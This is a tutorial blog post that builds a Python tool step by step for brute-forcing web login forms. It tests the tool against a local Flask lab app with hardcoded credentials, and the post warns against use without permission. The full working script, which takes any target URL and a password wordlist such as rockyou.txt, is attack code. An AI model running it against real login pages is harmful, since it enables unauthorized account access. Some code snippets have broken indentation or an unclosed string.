---
title: "Learning Python: Web Bruteforcing"
description: Working through making a Python program to bruteforce web login pages
date: 2024-12-10 00:00:00 +0000
categories: [Learning Topics, Python]
tags: [Python, tools, brute force, lab, pentest, hash, web]
pin: true
math: true
mermaid: true
comments: true
media_subpath: /images/PythonBruteWeb
img_path: /images/PythonBruteWeb
image:
  path: thumbnail_2.jpeg
---

 This post will be continuing the learning Python series, this time focusing on creating a Python based tool for bruteforcing web login pages. Tools like Hydra can accomplish this, but creating a custom tool can be a great learning experience, and be tailored to your personal needs, making it a valuable addition to your toolkit. This tool will be available on my [GitHub](https://github/Z3R0-sec).

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> Objectives: Create a Python program to bruteforce web login pages.
{: .prompt-info }
<!-- markdownlint-restore -->

## Introduction: Lab Setup

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> Objectives: Do not use this tool on any web page without permission. 
{: .prompt-danger }
<!-- markdownlint-restore -->

For this lab, we will be working with a simple web application that has a login page.  To provide a controlled environment for testing, I created a Python-based application using `Flask`, hosted locally on Kali Linux. The application is simple yet functional, designed to allow users to attempt login attempts using brute force techniques. Below is the Python script used to set up this testing environment.

```python
from flask import Flask, render_template, request, redirect
app = Flask(__name__)
# Hardcoded credentials for testing
USERNAME = "admin"
PASSWORD = "password123"
@app.route("/")
def home():
    return redirect("/login")
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
if username == USERNAME and password == PASSWORD:
            return "<h1>Login successful!</h1>"
        else:
            return "<h1>Login failed!</h1><p>Invalid username or password.</p>", 401
return render_template("login.html")
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
```

This script uses `Flask`, a lightweight web framework, to create the login page and handle user authentication. The application serves as a basic login page where the credentials are hardcoded for testing purposes. When a user attempts to log in, the application compares the inputted credentials with predefined values (admin and password123). If the input matches, the user is shown a success message; otherwise, a failure message is displayed.

`Flask` is ideal for this setup because of its simplicity. It allows us to create web applications with minimal configuration, and it provides easy handling of HTTP requests. `Flask` automatically manages the routing of incoming requests, handles form submissions (via POST), and returns dynamic responses.

Next, we will also need a login form for the application. Below is the HTML code for the login form:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
</head>
<body>
    <h1>Login Page</h1>
    <form action="/login" method="POST">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required>
        <br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
        <br><br>
        <button type="submit">Login</button>
    </form>
</body>
</html>
```

This HTML file serves as the frontend for the `Flask` application. It contains input fields for username and password, which are submitted when the user clicks the "Login" button. The credentials are sent to the `Flask` server via a POST request for validation. If the credentials are correct, the `Flask` app will return a success message; otherwise, it will return a failure message.

Final Setup:
1. Create a folder named `templates`{: .filepath}.
2. Place the `login.html`{: .filepath} file inside the templates folder.
3. Run the `Flask` app using Python.

Once set up, we will have a fully functional login page ready for testing bruteforce login attacks.

<div style="display: flex; justify-content: space-between;">
  <img src="picture1.png" alt="Screenshot" style="width: 800px; height: auto;"/>
  <img src="picture2.png" alt="Screenshot" style="width: 1200px; height: auto;"/>
</div>

## Creating v1.0

First, let's check what message a successful login attempt will return. This will give us the message to look for when creating the script. We will include that message as the "needle" variable in the script. If you were conducting an actual pentest engagement, you would need to find this message by inspecting the server's response to a successful login attempt. This could be done by creating a false account and authenticating with it, just to find out what the success message is.

![Screenshot](picture3.png)

I'll go through each section of the code to explain what it does and why it is needed. Starting with the imports:

```python
import requests 
import sys
```

The `requests` library is used to send HTTP POST requests to the target web application, enabling the script to submit login attempts. Meanwhile, the `sys` module provides access to system-level functions, such as writing progress updates directly to the console and exiting the script when a valid password is found.

```python
target = "http://127.0.0.1:5000/login"
usernames = ["admin", "user", "administrator"]
passwords = "rockyou.txt"
needle = "Login successful!
```

The `target` is the URL of the login page where the brute force attack will be performed. The `usernames` refer to a list of potential usernames to test during the attack. The `passwords` specify the file containing potential password combinations to try. Finally, the `needle` is the success message that the script looks for in the server's response to identify a valid login attempt.

```python
for username in usernames:
    with open(passwords, "r") as passwords_list:
```

The outer loop iterates through each `username` in the `usernames` list, ensuring that each username is tested against the provided passwords. Inside the loop, the `passwords` file is opened in read mode, allowing the script to access the list of potential passwords for brute force attempts. This structure ensures that every username is paired with every password in the file during the attack.

```python
        for password in passwords_list:
            password = password.strip("\n").encode()
            sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
            sys.stdout.flush()
```

The inner loop iterates through each password in the `passwords_list` file, ensuring that each password is tested for the current username. The `password.strip("\n")` method removes any newline characters from the password, and `.encode()` converts the password into bytes for compatibility with the `requests` library. To provide real-time feedback, the script displays the current username-password combination being tested using `sys.stdout.write` and updates it on the same line by clearing the buffer with `sys.stdout.flush()`.

```python
            r = requests.post(target, data={"username": username, "password": password})
```

The script sends an HTTP POST request to the target URL using `requests.post`, with the current `username` and `password` included as form data. This action simulates a login attempt by submitting the credentials to the web application's login page.

```python
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
                sys.exit()
                sys.stdout.flush()
```

The script checks whether the `needle` (the predefined success message) is present in the response content (`r.content`). If the needle is found, it indicates a valid login. The script then prints a success message, specifying the correct password and username, and exits immediately using `sys.exit()` to stop further brute force attempts.

```python
        sys.stdout.write("\n")
        sys.stdout.write("\tNo password found for '{}'!".format(username))
        sys.stdout.write("\n")
```

If all passwords in the list are tested for a particular username and none result in a successful login, the script prints a message stating that no valid password was found for that username. It then moves on to the next username in the list, continuing the brute force process.

The final version of the script is below:

```python
import requests  
import sys

target = "http://127.0.0.1:5000/login"
usernames = ["admin", "user", "administrator"]
passwords = "rockyou.txt"
needle = "Login successful!"

for username in usernames:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n").encode()
            sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
            sys.stdout.flush()
            r = requests.post(target, data={"username": username, "password": password})
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
                sys.exit()
                sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write("\tNo password found for '{}'!".format(username))
        sys.stdout.write("\n")  
```

Overall Functionality

1. Iterates through a list of usernames.
2. For each username, it tests every password in the provided wordlist.
3. Sends login requests to the target web application.
4. Identifies success by checking for the presence of a specific message in the server's response.
5. Stops execution on a successful login or notifies the user if no valid password is found for a username.

In the next section, we will test the script to see if it works as expected.

### Testing v1.0

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> Objectives: Again, do not use this tool on any web page without permission. 
{: .prompt-danger }
<!-- markdownlint-restore -->

This script runs with set variables, meaning there shouldn't be any errors relating to user input. All we have to do is run the script to see if it works as expected.

![Screenshot](picture4.png)

The script successfully cracked the password for the admin user. In the next section, we will improve the script.  

## Improving the Code: Adding Support for User Arguments

We will again go through each section of the code to explain what it does and why it is needed. Starting with the imports:

```python
import requests  
import sys
import argparse
```

The script uses the continues using the `requests` library to send HTTP POST requests to the target login page, attempting bruteforce login. The `sys` library handles console output and exits the program when a valid password is found. Additionally, `argparse` allows the user to customize the script's behavior by specifying the target URL, username list, and password file directly from the command line, making the tool more versatile and easier to use.

```python
parser = argparse.ArgumentParser(description="Web Login Bruteforce Tool")
parser.add_argument("-t", "--target", required=True, help="Target URL")
parser.add_argument("-u", "--username", help="Single username to test")
parser.add_argument("-U", "--usernames", help="File containing list of usernames")
parser.add_argument("-w", "--wordlist", required=True, help="File containing list of passwords")
parser.add_argument("-n", "--needle", default="Login successful!", help="Needle (success message) to identify successful login")
args = parser.parse_args()
```

The `ArgumentParser` is initialized with a description of the script, and various arguments are added for the user to specify input. The `-t` (target URL), `-u` (single username), `-U` (usernames file), and `-w` (passwords file) options allow the user to define the parameters for the bruteforce attempt. Additionally, a `-n` argument is included to specify a custom success message (needle) to identify a successful login, with a default value of "Login successful!". The arguments are then parsed and stored in the `args` object for use in the script.

```python
target = args.target    
passwords_file = args.wordlist
needle = "Login successful!"
```

In this section, the script initializes key variables using the arguments parsed earlier. The `target` variable holds the URL of the login page specified by the `-t` argument. The `passwords_file` variable stores the path to the wordlist file provided via the `-w` argument. The `needle` is a string that will be searched in the response to identify a successful login, with a default value of "Login successful!". Depending on the target web application's response, this string may need to be adjusted to fit the specific success message.

```python
if not args.username and not args.usernames:
    print("Error: You must specify either a single username (-u) or a username file (-U).")
    sys.exit(1)
```

This section ensures that the user provides at least one of the required username inputs. It checks whether the `-u` argument (for a single username) or the `-U` argument (for a file of usernames) is supplied. If neither is provided, the script will print an error message and exit, preventing the brute force process from running without the necessary username input. This validation helps avoid unnecessary execution and provides clear guidance to the user.

```python
if args.username:
    usernames = [args.username]
elif args.usernames:
    try:
        with open(args.usernames, "r") as f:
            usernames = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Error: File '{args.usernames}' not found.")
        sys.exit(1)
```

The script loads the usernames based on the input provided by the user. If a single username is given with the `-u` argument, it is converted into a list for consistency with the other cases. If a file of usernames is provided using the `-U` argument, the script attempts to open and read the file, storing each line as a username (ignoring any blank lines). If the file cannot be found, an error message is displayed, and the script exits. This allows flexibility in testing either a single username or a list from a file.

```python
for username in usernames:
    try:
        with open(passwords_file, "r", encoding="latin-1") as passwords_list:
            for password in passwords_list:
                password = password.strip("\n").encode()
                sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
                sys.stdout.flush()
                r = requests.post(target, data={"username": username, "password": password})
                if needle.encode() in r.content:
                    sys.stdout.write("\n")
                    sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
                    sys.exit(0)
```

In the main bruteforce function, the script iterates through each username in the list, opening the passwords file and attempting each password in turn. For each password, it strips any newline characters, encodes the password as bytes, and sends a POST request to the target login page with the username and password as form data. The progress is displayed on the console, showing the current username and password being tested. If the login attempt is successful (indicated by the presence of the needle string in the response), the script outputs the valid password for the username and stops further execution.

```python
sys.stdout.write("\n")
            sys.stdout.write("\tNo password found for '{}'!".format(username))
    except FileNotFoundError:
        print(f"Error: File '{passwords_file}' not found.")
        sys.exit(1)
```

In the failure handling section, if no valid password is found for a user after all attempts, the script outputs a message indicating failure for that username. If the passwords file is missing or cannot be accessed, a `FileNotFoundError` is caught, an error message is printed, and the script exits. This ensures that the user is informed about any issues with the files being used.

The final version of the script is below:

```python
import requests  
import sys
import argparse  

parser = argparse.ArgumentParser(description="Web Login Bruteforce Tool")
parser.add_argument("-t", "--target", required=True, help="Target URL")
parser.add_argument("-u", "--username", help="Single username to test")
parser.add_argument("-U", "--usernames", help="File containing list of usernames")
parser.add_argument("-w", "--wordlist", required=True, help="File containing list of passwords")
parser.add_argument("-n", "--needle", default="Login successful!", help="Needle (success message) to identify successful login")
args = parser.parse_args()

target = args.target    
passwords_file = args.wordlist
needle = args.needle  

if not args.username and not args.usernames:
    print("Error: You must specify either a single username (-u) or a username file (-U).")
    sys.exit(1)

if args.username:
    usernames = [args.username]
elif args.usernames:
    try:
        with open(args.usernames, "r") as f:
            usernames = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Error: File '{args.usernames}' not found.")
        sys.exit(1)

for username in usernames:
    try:
        with open(passwords_file, "r", encoding="latin-1") as passwords_list:
            for password in passwords_list:
                password = password.strip("\n").encode()
                sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
                sys.stdout.flush()
                r = requests.post(target, data={"username": username, "password": password})
                if needle.encode() in r.content:
                    sys.stdout.write("\n")
                    sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
                    sys.exit(0)
            sys.stdout.write("\n")
            sys.stdout.write("\tNo password found for '{}'!".format(username))
    except FileNotFoundError:
        print(f"Error: File '{passwords_file}' not found.")
        sys.exit(1)
```

The improved version of the script enhances flexibility and usability by allowing users to specify the target URL, username(s), password wordlist, and success message ("needle") via command-line arguments. This makes the script adaptable to different testing scenarios. Input validation ensures that either a single username or a file of usernames is provided, while error handling accounts for missing files. The updated script also includes better progress tracking, displaying real-time login attempts, and exits promptly when a valid login is found. These changes make the tool more robust and user-friendly for brute-forcing login pages.

### Testing v2.0

We'll start by testing the script with no options to see if it provides help on how to properly use it.

![Screenshot](picture5.png)

And we can see the correct usage of the script, with all the options available. Next, let's test the script with a single username and a wordlist to see if it works as expected. The sysntax is as follows:

```shell
python3 bruteforce.py -t http://127.0.0.1:5000/login -u admin -w rockyou.txt
```

![Screenshot](picture6.png)

The script successfully cracked the password for the admin user. The script works as expected. If you can recall, the default value for a successful login will show us "Login successful!". Let's check if inputting a random string for the value will impact the script. If it works, then the password should not be cracked. This can be done with the follwoing command:
    
```shell
python3 bruteforce.py -t http://127.0.0.1:5000/login -u admin -w rockyou.txt -n "Random string"
```

![Screenshot](picture7.png)

As expected, the script did not crack the password. So if be sure to input the correct value for the needle. If we again specify the correct value, the password should be cracked:

```shell
python3 bruteforce.py -t http://127.0.0.1:5000/login -u admin -w rockyou.txt -n "Login successful!"
```

![Screenshot](picture8.png)

Up to this point, the script is working as expected and much more user-friendly. Additional updates can be made, but that is beyond the scope of this lab.

## Conclusion
In this lab, we have successfully created another Python[^1] tool, this time to crack web login pages using brute force techniques. The tool allows users to specify the target URL, username(s), password wordlist, and success message via command-line arguments, providing flexibility and ease of use. The tool enhanced my learning experience by working through how to create a versatile and user-friendly Python script for web application security testing. The tool will be available on my [GitHub](https://github.com/Z3R0-sec) for anyone to use safely and responsibly.

I recommend any fellow learners to try and create their own tools, as it is a great way to learn and improve your skills and gain a deeper understanding of the concepts involved. I have one more Python tool in mind, so stay tuned for the next post!

### Useful Resources

[^1]: Source: [Python Documentation](https://docs.python.org/3/)